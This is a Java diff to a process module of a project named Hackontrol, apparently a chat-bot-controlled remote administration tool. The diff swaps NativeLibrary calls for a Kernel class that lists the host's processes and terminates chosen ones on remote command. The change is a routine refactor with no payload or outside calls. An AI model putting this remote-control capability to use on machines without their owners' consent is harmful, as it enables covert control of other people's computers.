@@ -4,7 +4,6 @@ import java.util.ArrayList;
 import java.util.Comparator;
 import java.util.List;
 
-import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.ProcessEntry;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
@@ -13,6 +12,7 @@ import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.manager.interaction.ModalContext;
 import com.khopan.hackontrol.manager.interaction.StringSelectContext;
 import com.khopan.hackontrol.manager.interaction.StringSelectManager;
+import com.khopan.hackontrol.nativelibrary.Kernel;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
@@ -86,7 +86,7 @@ public class ProcessModule extends Module {
 	}
 
 	private void buttonTerminate(ButtonContext context) {
-		ProcessEntry[] processList = NativeLibrary.listProcess();
+		ProcessEntry[] processList = Kernel.getProcessList();
 		int minimumIdentifier = Integer.MAX_VALUE;
 		int maximumIdentifier = Integer.MIN_VALUE;
 
@@ -127,7 +127,7 @@ public class ProcessModule extends Module {
 			return;
 		}
 
-		int currentProcessIdentifier = NativeLibrary.currentIdentifier();
+		int currentProcessIdentifier = Kernel.getCurrentProcessIdentifier();
 
 		if(processIdentifier == currentProcessIdentifier) {
 			HackontrolMessage.boldDeletable(context.reply(), "Due to security reason, terminating the Hackontrol process is not allowed");
@@ -135,7 +135,7 @@ public class ProcessModule extends Module {
 		}
 
 		TimeSafeReplyHandler.start(context, consumer -> {
-			ProcessEntry[] processList = NativeLibrary.listProcess();
+			ProcessEntry[] processList = Kernel.getProcessList();
 			List<Integer> killList = new ArrayList<>();
 			killList.add(processIdentifier);
 
@@ -150,7 +150,7 @@ public class ProcessModule extends Module {
 			int size = killList.size();
 
 			for(int i = 0; i < size; i++) {
-				NativeLibrary.terminate(killList.get(i));
+				Kernel.terminateProcess(killList.get(i));
 			}
 
 			HackontrolMessage.boldDeletable(ConsumerMessageCreateDataSendable.of(consumer), "Successfully terminate " + size + " process" + (size == 1 ? "" : "es"));
@@ -171,7 +171,7 @@ public class ProcessModule extends Module {
 
 	private void send(IReplyCallback callback) {
 		List<ProcessEntry> processList = new ArrayList<>();
-		processList.addAll(List.of(NativeLibrary.listProcess()));
+		processList.addAll(List.of(Kernel.getProcessList()));
 		processList.sort(this.sortRule.comparator);
 		int longestIdentifierLength = 0;
 
@@ -180,7 +180,7 @@ public class ProcessModule extends Module {
 		}
 
 		longestIdentifierLength += 3;
-		int currentProcessIdentifier = NativeLibrary.currentIdentifier();
+		int currentProcessIdentifier = Kernel.getCurrentProcessIdentifier();
 		StringBuilder builder = new StringBuilder();
 
 		for(int x = 0; x < processList.size(); x++) {
